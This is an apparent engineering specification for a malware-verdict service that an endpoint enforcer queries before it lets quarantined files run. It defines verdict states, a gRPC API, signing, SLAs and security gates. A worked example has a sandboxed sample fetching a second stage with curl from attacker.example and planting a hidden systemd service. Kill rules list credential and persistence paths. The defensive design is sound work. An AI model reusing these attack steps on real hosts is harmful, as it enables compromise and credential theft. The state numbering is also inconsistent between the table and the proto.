# xgenguardian — integration specification for xhelix Phase O

> This document is **for the xgenguardian development team**. It defines the off-host verdict service that xhelix's `pkg/guardianclient` connects to in Phase O (Artifact Quarantine).
> xhelix does **not** implement any of this; xhelix only consumes the API + signed verdicts defined here.
> Author: xhelix team. Date: 2026-05-27.

---

## 1. Mission

When xhelix observes a new dangerous-class artifact (executable, script, installer, macro doc, disk image, suspicious archive) being written to a non-package-manager path and that artifact then attempts to execute / load / interpret, xhelix parks the process and asks **xgenguardian** for a verdict.

xgenguardian's job: **return a signed verdict in <3 s for static analysis and <60 s for behavioral detonation, with a clear state from a 7-state model.**

xgenguardian is the analysis brain. xhelix is the on-host enforcer. The two systems share **only** the API surface defined here.

---

## 2. Deployment model

```
        ┌───────────────────────────────────────────────────────────┐
        │ xhelix-managed host (workstation or server)                │
        │                                                            │
        │   pkg/execgate observes attempted exec of quarantined file │
        │   pkg/guardianclient → mTLS gRPC → xgenguardian            │
        │                                                            │
        │   local verdict cache (sqlite, 7-day TTL, on /var/lib)     │
        │   on-host firejail fallback if xgenguardian unavailable    │
        └───────────────────────────────┬───────────────────────────┘
                                        │ mTLS gRPC (TLS 1.3)
                                        │ Ed25519-signed responses
                                        ▼
        ┌───────────────────────────────────────────────────────────┐
        │ xgenguardian host (e.g. 135.181.79.11)                    │
        │                                                            │
        │   gRPC API server (port 8443 over TLS — NOT 50051 plain)   │
        │   ├─ VerdictService (sync hash lookup + queue detonation) │
        │   ├─ HashService (bulk reputation lookup)                  │
        │   └─ ManifestService (signed trusted-hash manifests)       │
        │                                                            │
        │   workers:                                                 │
        │   ├─ static analyzer (yara + magic + entropy + signing)    │
        │   ├─ sandbox detonator (Cuckoo / Joe-like / custom VM)     │
        │   ├─ AI/LLM behavior summarizer (optional, advisory only)  │
        │   └─ verdict signer (Ed25519 with offline-rotated keys)    │
        │                                                            │
        │   persistence: reputation DB + verdict history + sandbox   │
        │                report archive (immutable, append-only)     │
        └───────────────────────────────────────────────────────────┘
```

---

## 3. Verdict states (canonical 7-state model)

xhelix's `pkg/artifactgate` and xgenguardian MUST agree on these. Any new state requires a coordinated schema bump.

| State | Numeric | Meaning | xhelix action on receipt |
|---|---|---|---|
| `UNKNOWN` | 0 | xgenguardian has not seen this hash yet | xhelix proceeds to behavioral detonation request or on-host fallback |
| `QUARANTINED` | 1 | analysis in progress; check back later | xhelix keeps process SIGSTOP'd; re-poll every 2 s up to 60 s |
| `ALLOWED_ONCE` | 2 | run once with full monitoring; recheck on next exec | xhelix releases SIGSTOP, marks artifact for elevated runtime constraints, will re-verdict on next run |
| `TRUSTED_HASH` | 3 | signed positive verdict, TTL applies | xhelix releases SIGSTOP, caches verdict, allows future runs until TTL expires |
| `RESTRICTED` | 4 | allowed but with constraints (no network / no secrets / no persistence) | xhelix releases SIGSTOP, applies stricter BRP profile or egressguard tag for duration of process |
| `MALICIOUS` | 5 | confirmed malicious — kill, ban hash, alert | xhelix kills process, adds hash to local denylist, emits Class 1 alert |
| `EXPIRED_TRUST` | 6 | prior TRUSTED_HASH whose TTL has lapsed; recheck required | xhelix treats as UNKNOWN; re-requests verdict |

**Disallowed:** there is no `SAFE` or `CLEAN` state. xgenguardian must commit to one of the 7; the closest to "no issue" is `TRUSTED_HASH` with a TTL.

---

## 4. gRPC API

### 4.1 Connection

- **Address:** configurable per xhelix host; default `xgenguardian.internal:8443`
- **Transport:** gRPC over TLS 1.3
- **Auth:** **mutual TLS**. xhelix presents a client cert from `/etc/xhelix/guardian-client.crt` + key. xgenguardian validates client cert against its allowed-host CA. xhelix validates xgenguardian's server cert against pinned SPKI hash from config.
- **NOT acceptable:** plain text gRPC on port 50051, public bind, no client auth. The current `135.181.79.11:50051` lab deployment fails on all of these.

### 4.2 Service definitions

```proto
syntax = "proto3";
package xgenguardian.v1;

import "google/protobuf/timestamp.proto";

service VerdictService {
  // Look up a known verdict by hash. Returns UNKNOWN if not yet analyzed.
  // SLA: <50ms p99 from local cache hit; <500ms from cold lookup.
  rpc GetVerdict(GetVerdictRequest) returns (GetVerdictResponse);

  // Submit an artifact for analysis. Returns a request_id immediately;
  // caller polls GetVerdict by hash to retrieve the verdict.
  // SLA: <3s p99 for static-analysis-only verdicts;
  //      <60s p99 for behavioral detonation verdicts.
  rpc SubmitArtifact(SubmitArtifactRequest) returns (SubmitArtifactResponse);

  // Stream future verdict updates for a hash. xhelix uses this for
  // long-running behavioral analyses where polling is wasteful.
  rpc StreamVerdict(StreamVerdictRequest) returns (stream Verdict);
}

service HashService {
  // Bulk hash lookup, up to 256 hashes per request. For xhelix's
  // local-cache warmup on daemon start.
  rpc BulkLookup(BulkLookupRequest) returns (BulkLookupResponse);
}

service ManifestService {
  // Operator publishes a manually-trusted hash through xgenguardian's
  // own admin UI; ManifestService propagates it to xhelix hosts.
  rpc GetTrustedHashes(GetTrustedHashesRequest) returns (stream TrustedHashEntry);

  // Reverse direction: xhelix reports manually-trusted-by-operator hashes
  // upstream so they can be cross-fleet propagated (Phase F dependency).
  rpc ReportLocalTrust(ReportLocalTrustRequest) returns (ReportLocalTrustResponse);
}

// ──────────────────────────────────────────────────────────────────
// Messages
// ──────────────────────────────────────────────────────────────────

message ArtifactRef {
  // Primary identifier. SHA-256 hex.
  string sha256 = 1;

  // Optional similarity hashes — xgenguardian uses these for
  // fuzzy match against known malware families.
  string ssdeep = 2;
  string imphash = 3;  // for PE/ELF imports

  // Classification context (already computed by xhelix client-side).
  ArtifactClass artifact_class = 4;
  uint64 size_bytes = 5;

  // Provenance (everything xhelix knows about how the file arrived).
  string origin_url = 6;       // if from browser/curl, the source URL
  string origin_domain = 7;    // hostname extracted from origin_url
  string source_app = 8;       // process that wrote the file (curl, firefox, npm…)
  uint32 downloaded_by_uid = 9;
  google.protobuf.Timestamp downloaded_at = 10;
  string source_anchor_id = 11; // xhelix source anchor (sshd session, sudo, etc.)
}

enum ArtifactClass {
  ARTIFACT_CLASS_UNSPECIFIED = 0;
  NATIVE_EXECUTABLE = 1;       // .exe, .msi, .dll, .so, .elf, .bin, .run, .AppImage
  SCRIPT = 2;                  // .sh, .bash, .ps1, .bat, .vbs, .js, .py, .pl, .rb, .php, .lua
  INSTALLER = 3;               // .deb, .rpm, .pkg, .dmg, .apk, .jar, .war, .ear
  OFFICE_MACRO = 4;            // .docm, .xlsm, .pptm, .xlam
  EXPLOITABLE_DOC = 5;         // .pdf, .docx, .xlsx, .pptx, .rtf, .one
  ARCHIVE = 6;                 // .zip, .rar, .7z, .tar, .gz, .xz
  DISK_IMAGE = 7;              // .iso, .img, .vhd, .vmdk
  MEDIA = 8;                   // .jpg, .png, .mp4, .mp3, .svg (lower risk)
  PLAIN_DATA = 9;              // .txt, .csv, .json, .yaml, .md (lowest risk)
}

message GetVerdictRequest {
  ArtifactRef artifact = 1;
  string requesting_host = 2;
  string xhelix_version = 3;
}

message GetVerdictResponse {
  Verdict verdict = 1;
}

message Verdict {
  string sha256 = 1;
  VerdictState state = 2;
  google.protobuf.Timestamp issued_at = 3;
  google.protobuf.Timestamp valid_until = 4;   // TTL — after this xhelix re-requests

  string reason_summary = 5;                   // one-line human-readable
  repeated string detection_tags = 6;          // ["c2_beacon", "credential_stealer", ...]
  repeated string mitre_techniques = 7;        // ["T1071", "T1059.004", ...]

  // For state=RESTRICTED, this carries the constraints xhelix must apply.
  RestrictedConstraints restricted = 8;

  // Ed25519 signature over the canonical serialization of fields 1-8.
  bytes signature = 9;
  string signing_key_id = 10;
}

enum VerdictState {
  VERDICT_STATE_UNSPECIFIED = 0;
  UNKNOWN = 1;
  QUARANTINED = 2;
  ALLOWED_ONCE = 3;
  TRUSTED_HASH = 4;
  RESTRICTED = 5;
  MALICIOUS = 6;
  EXPIRED_TRUST = 7;
}

message RestrictedConstraints {
  bool no_outbound_network = 1;
  bool no_secret_paths = 2;          // read of /.aws/, /.ssh/, /var/run/secrets/ → kill
  bool no_persistence_writes = 3;    // write to /etc/systemd/, cron, ld.so.preload → kill
  uint32 max_runtime_seconds = 4;    // 0 = unlimited
  repeated string allowed_outbound_hosts = 5;  // when no_outbound_network=false but limited
}

message SubmitArtifactRequest {
  ArtifactRef artifact = 1;
  bytes content = 2;                            // file content; xgenguardian server may chunk
  bool behavioral_analysis_requested = 3;       // false = static only (fast); true = detonate
  uint32 priority = 4;                          // 0=batch, 10=urgent (operator-flagged)
}

message SubmitArtifactResponse {
  string request_id = 1;
  google.protobuf.Timestamp estimated_completion = 2;
  VerdictState provisional_state = 3;           // typically QUARANTINED
}

message StreamVerdictRequest {
  string sha256 = 1;
  uint32 timeout_seconds = 2;
}

message BulkLookupRequest {
  repeated string sha256_hexes = 1;             // up to 256
}

message BulkLookupResponse {
  map<string, Verdict> verdicts = 1;            // sha256 -> Verdict
}

message GetTrustedHashesRequest {
  google.protobuf.Timestamp since = 1;
  uint32 max_entries = 2;
}

message TrustedHashEntry {
  string sha256 = 1;
  Verdict verdict = 2;
}

message ReportLocalTrustRequest {
  string sha256 = 1;
  string operator_id = 2;                       // who manually trusted on the host
  string reason = 3;
  google.protobuf.Timestamp trusted_at = 4;
}

message ReportLocalTrustResponse {
  bool accepted = 1;
  string reason = 2;
}
```

---

## 5. Verdict signing

Every `Verdict` message field 9 (`signature`) MUST be an Ed25519 signature over the canonical CBOR serialization of fields 1-8.

- Signing keys are operator-rotated; current public key distributed via `/etc/xhelix/xgenguardian-keys.d/*.pub`
- xhelix's `pkg/guardianclient` validates the signature on every received Verdict
- An unsigned or invalid-signature Verdict is **treated as UNKNOWN** — xhelix falls back to on-host detonation
- Key rotation is documented separately; key compromise triggers fleet-wide cache invalidation via `signing_key_id`

---

## 6. Analysis pipeline (server-side responsibilities)

xgenguardian's internal pipeline is its own implementation choice, but **at minimum** must include:

| Stage | Required signal | Tools that satisfy this |
|---|---|---|
| **Hash reputation** | local DB + community feeds (VirusTotal, MalwareBazaar, AbuseCH) | reputation tables; cache 30d |
| **File-type detection** | magic bytes, MIME inference, real-class regardless of extension | `libmagic`, `file`, custom regex |
| **Static analysis** | yara rule match, string extraction, entropy, packed-binary detection | yara, ssdeep, peframe, ELFhash |
| **PE/ELF inspection** | import hash, signer, signature validity | `pefile`, `elf-parser`, `osslsigncode` |
| **Sandbox detonation** | actually run the artifact for behavioral observation | Cuckoo, Joe Sandbox, CAPE, or custom QEMU VM |
| **Behavioral classification** | extract syscall summary, network attempts, file writes, persistence drops | strace + bpftrace + tcpdump inside sandbox |
| **AI/LLM summarization (optional)** | one-line `reason_summary` from raw sandbox report | any LLM; advisory only — never the sole signal |
| **Verdict issuance** | sign with Ed25519, record in append-only audit log | offline-key signer; immutable journal |

**Required:** behavioral signals must be **structured, not free-form prose**. Free-form LLM output goes in `reason_summary` (human-readable, advisory) but never drives the `state` decision. The state must derive from structured signals (yara hit, sandbox observed credential theft, etc.).

---

## 7. SLA targets

| Operation | p50 | p99 | Hard timeout |
|---|---|---|---|
| `GetVerdict` on cache hit | <10ms | <50ms | 200ms |
| `GetVerdict` on cache miss → cold lookup | <300ms | <2s | 3s |
| `SubmitArtifact` (static-only) | <1s | <3s | 5s |
| `SubmitArtifact` (behavioral detonation) | <30s | <60s | 120s |
| `BulkLookup` (256 hashes) | <500ms | <2s | 5s |
| `StreamVerdict` time-to-first-verdict | <1s | <5s | 30s |

xhelix's `pkg/guardianclient` enforces the client-side hard timeouts and falls back to on-host firejail detonation on miss. **Beating SLA matters more than perfect verdicts** — a slow xgenguardian becomes a single-point-of-failure for every exec on the fleet.

---

## 8. Reliability requirements

| Requirement | Why |
|---|---|
| HA / active-active deployment | xhelix exec is gated on this; xgenguardian unavailable = workstation hangs (or fail-open exposes attack surface) |
| Graceful degradation | static-analysis-only mode if sandbox capacity exhausted |
| Audit log of every verdict issued | for blue-team review + dispute resolution |
| Reproducible verdicts where possible | same hash + same xgenguardian version should produce same verdict |
| Versioned key rotation | compromise of one signing key shouldn't invalidate every cached verdict immediately; xhelix supports multi-key |
| Operator dashboard | view pending detonations, recent verdicts, sandbox queue depth |

---

## 9. Security requirements

**Mandatory before xhelix Phase O promotes past `mode: observe`:**

| # | Issue | Why this blocks production integration |
|---|---|---|
| 1 | Service must NOT run as root from `/tmp/go-build...` | not production-safe; supply-chain attacker who writes `/tmp` can swap the binary |
| 2 | gRPC port (8443) MUST be bound to private/internal network or behind mTLS only | current `*:50051` plain on `135.181.79.11` is unsafe; verdict service is a high-value target |
| 3 | The `/tmp/phishlab` HTTP server on `:38888` must be removed or moved to a separate non-production host | lab artifact; should not co-exist with a production verdict service |
| 4 | All credentials in `docker-compose` must be moved to a secrets manager (Vault, AWS Secrets Manager, Doppler, or environment-from-encrypted-volume) | dev creds in compose = root-equivalent compromise if compose file leaks |
| 5 | Signed release artifact flow (cosign or equivalent) for the xgenguardian server binary itself | xhelix trusts xgenguardian's verdicts; xgenguardian binary must be tamper-evident |
| 6 | Signing key MUST be on an HSM or air-gapped offline-signer | key compromise = ability to forge "TRUSTED_HASH" verdicts for malware → universal bypass |
| 7 | Audit log MUST be append-only (WORM storage or signed-chain like xhelix uses) | post-incident review needs immutable verdict history |
| 8 | Sandbox VMs MUST be reset to known-good snapshot between detonations | malware persisting in sandbox = false trusted verdicts later |
| 9 | mTLS client cert revocation list propagation | compromised xhelix host shouldn't continue submitting verdicts as if trusted |
| 10 | Rate limiting per client cert | one misbehaving host shouldn't DoS the verdict service |

These map to the issues called out in operator review of the current `135.181.79.11` deployment. **All 10 must be addressed before xhelix Phase O ships in any enforce mode.**

---

## 10. Data flow examples

### 10.1 First-run of a brand-new browser-downloaded ELF binary

```
1. User downloads `vscode-cli` from random URL into ~/Downloads/
2. xhelix pkg/fim observes the write. pkg/artifactclass classifies:
     artifact_class=NATIVE_EXECUTABLE, risk=Critical
     origin_url="http://attacker.example/...", origin_domain="attacker.example"
     source_app="firefox", downloaded_by_uid=1000
   pkg/artifactgate stores state=QUARANTINED.
3. User runs `./vscode-cli` from terminal.
4. BPF-LSM bprm_check_security hook fires:
   - file hash queried in pkg/artifactgate → state=QUARANTINED
   - exec is paused (SIGSTOP); BPF returns -EPERM in enforce mode
5. pkg/guardianclient calls xgenguardian.VerdictService.GetVerdict(sha256=...)
   - cache MISS (first time seeing this hash)
6. pkg/guardianclient calls xgenguardian.SubmitArtifact:
     content=file bytes
     behavioral_analysis_requested=true
     priority=10 (operator-facing — user is waiting)
7. xgenguardian:
   a. Static analyzer: yara hit on suspicious string patterns, entropy=7.2 (packed)
   b. Sandbox detonation: artifact attempts `curl http://attacker.example/stage2`
      and writes to `/etc/systemd/system/.helper.service`
   c. Verdict signer produces:
      state=MALICIOUS, reason_summary="packed binary attempts persistence + C2 outbound",
      detection_tags=["c2_beacon", "persistence_drop"],
      mitre_techniques=["T1071", "T1543.002"],
      signature=Ed25519(...)
8. xhelix pkg/guardianclient receives signed verdict:
   - signature verified against /etc/xhelix/xgenguardian-keys.d/2026-Q2.pub
   - cached locally with valid_until=now+7days
   - SIGKILL'd the parked process
   - emits Class 1 alert: artifact_malicious sha256=... reason=...
   - pkg/netban adds attacker.example to nftables drop list
```

### 10.2 First-run of a legitimate npm-installed binary

```
1. User runs `npm install -g typescript`
2. npm child process writes /usr/local/lib/node_modules/typescript/bin/tsc
   during an active `pkg_install_window=true` transaction (Phase K.2 tag)
3. pkg/artifactgate sees the write, recognizes the pkg-install window,
   takes the FAST-PATH: tags artifact as TRUSTED_PROVENANCE, no quarantine.
4. User runs `tsc --version` later.
5. BPF-LSM bprm_check_security hook fires:
   - file hash queried → state=TRUSTED_PROVENANCE (provenance-allowed)
   - no xgenguardian call needed
   - exec proceeds normally
6. Verdict cached: if same hash is later observed via a different
   provenance path (e.g. copied to /tmp), the trusted-provenance tag does
   NOT carry over — it's path-specific.
```

### 10.3 xgenguardian unavailable

```
1. New artifact attempts exec.
2. pkg/guardianclient.GetVerdict times out (3s).
3. pkg/sandbox falls back to on-host firejail/bubblewrap:
   - read-only rootfs, no network, no /proc /sys access
   - run for 30s, capture syscall summary + write list
4. If artifact didn't try suspicious paths and didn't crash:
   - state=ALLOWED_ONCE
   - parked process released
   - next exec attempt re-runs the verdict path (no caching on fallback)
5. If artifact tried `curl` or wrote to /etc/:
   - state=MALICIOUS, SIGKILL, hash banned locally
```

---

## 11. Migration path for the existing `135.181.79.11` deployment

The current xgenguardian-shaped service on `135.181.79.11` is operator-flagged as **lab-grade**, not production. Migration sequence to support xhelix Phase O:

| Step | Owner | Pre-Phase-O-shadow | Pre-Phase-O-enforce |
|---|---|---|---|
| 1 | xgenguardian team | move service off `/tmp/go-build` to `/usr/local/bin/xgenguardian` with systemd unit; non-root user | required |
| 2 | xgenguardian team | private network bind, mTLS on, port 8443 | required |
| 3 | xgenguardian team | remove `/tmp/phishlab :38888` from this host (move to lab-only host) | required for shadow promotion |
| 4 | xgenguardian team | secrets out of compose into vault | required |
| 5 | xgenguardian team | cosign-sign release artifact | required for enforce |
| 6 | xgenguardian team | HSM-backed Ed25519 signer | required for enforce |
| 7 | xgenguardian team | gRPC API per §4 (proto definitions provided) | required for any integration |
| 8 | xgenguardian team | audit log on WORM storage | required for enforce |
| 9 | xgenguardian team | sandbox-reset-to-snapshot between detonations | required for enforce |
| 10 | xhelix team | xhelix `pkg/guardianclient` + mTLS cert provisioning workflow | parallel work |
| 11 | both | end-to-end smoke test from a dev box with deliberately-malicious test corpus | gate to enforce |
| 12 | both | 7-day shadow soak (xhelix in `mode: observe` against live xgenguardian) | gate to enforce |
| 13 | operator | enforce-mode promotion decision | per-host operator call |

**At any point, xhelix can ship Phase O in `mode: off` (the default).** Promotion to `observe` requires steps 1-3, 7, 10. Promotion to `enforce` requires all 13.

---

## 12. What this document does NOT specify

xgenguardian's internal implementation choices are out of scope:

- Which sandbox technology (Cuckoo vs Joe vs custom QEMU): up to the xgenguardian team
- Which LLM (if any) for `reason_summary`: up to the xgenguardian team — but it CANNOT be the sole verdict driver
- Storage backend for reputation DB: PostgreSQL, ClickHouse, BadgerDB — operator choice
- AI/LLM model deployment (local vs API): operator choice
- HA topology (active-active vs active-standby): operator choice but must meet SLA in §7
- UI for operator dashboard: operator choice

**What IS specified:**
- gRPC API surface (§4) — frozen v1 contract
- Verdict states (§3) — frozen
- Signing format (§5) — Ed25519 over CBOR
- SLA targets (§7) — enforced by xhelix client timeouts
- Security requirements (§9) — gate to production integration

---

## 13. Versioning

| Component | Version | Compatibility |
|---|---|---|
| gRPC proto package | `xgenguardian.v1` | xhelix supports v1 only; v2 = breaking schema change |
| Verdict state enum | 7 values (§3) | adding states requires xhelix-side support; never renumber |
| Signing format | Ed25519 over CBOR canonical | extending requires `signing_key_id` namespace bump |
| API endpoint default | `xgenguardian.internal:8443` | overridable per-host via `/etc/xhelix/hardening/guardian.yaml` |

---

## 14. Contact + integration

xhelix-side integration owner: xhelix maintainer team
xgenguardian-side owner: **xgenguardian dev team — please assign**

Open questions to coordinate:
- Cert provisioning workflow (where do xhelix hosts get their client certs?)
- Verdict-disagreement resolution (operator marks something trusted that xgenguardian flagged malicious — who wins, locally?)
- Cross-fleet trust propagation (Phase F dependency on xhelix side)
- Sandbox technology selection (informs SLA realism)

This spec is locked at v1 as of 2026-05-27. Any change requires coordinated bump on both sides.
